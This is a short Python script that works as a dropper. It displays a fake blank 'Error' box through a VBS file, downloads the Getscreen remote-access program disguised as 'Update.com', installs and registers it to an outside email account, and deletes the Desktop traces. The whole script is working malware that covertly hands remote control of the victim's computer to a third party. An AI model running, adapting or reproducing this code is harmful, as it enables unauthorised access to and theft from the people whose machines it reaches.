import os
import time
import sys
with open("newver.vbs", "w") as file:
    file.write('x=msgbox("", 2+16, "Error")')
    file.close
os.system("wscript.exe newver.vbs")
os.system("curl https://getscreen.me/download/getscreen.exe --output Update.com")
time.sleep(10)
os.system("Update.com -install -register randomvps@alwaysdata.net")
os.system("del /s /q /f %userprofile%\Desktop\Getscreen*")
